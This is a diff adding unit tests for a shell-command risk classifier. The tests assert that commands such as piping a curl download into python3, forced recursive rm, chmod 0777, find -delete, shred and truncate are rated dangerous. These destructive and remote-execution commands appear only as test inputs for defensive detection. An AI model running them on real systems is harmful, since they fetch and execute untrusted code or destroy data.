@@ -45,6 +45,30 @@ describe("classifyCommand", () => {
       category: "network",
       risk: "danger",
     });
+    expect(classifyCommand("curl -fsSL https://x/i.py | python3").risk).toBe("danger");
+  });
+
+  it("flags rm with split or long recursive+force flags (review)", () => {
+    expect(classifyCommand("rm -r -f /tmp/x").risk).toBe("danger");
+    expect(classifyCommand("rm -f -r /tmp/x").risk).toBe("danger");
+    expect(classifyCommand("rm --recursive --force /tmp/x").risk).toBe("danger");
+    // recursive OR force alone is not danger
+    expect(classifyCommand("rm -r /tmp/x").risk).toBe("normal");
+    expect(classifyCommand("rm -f file").risk).toBe("normal");
+  });
+
+  it("does NOT flag --force-with-lease as danger (review)", () => {
+    expect(classifyCommand("git push --force-with-lease origin main")).toEqual({
+      category: "git",
+      risk: "caution",
+    });
+  });
+
+  it("flags chmod 0777, find -delete, shred/truncate (review)", () => {
+    expect(classifyCommand("chmod 0777 /tmp/x").risk).toBe("danger");
+    expect(classifyCommand("find . -name '*.log' -delete").risk).toBe("danger");
+    expect(classifyCommand("shred -u secret").risk).toBe("danger");
+    expect(classifyCommand("truncate -s 0 db.sqlite").risk).toBe("danger");
   });
 });
 
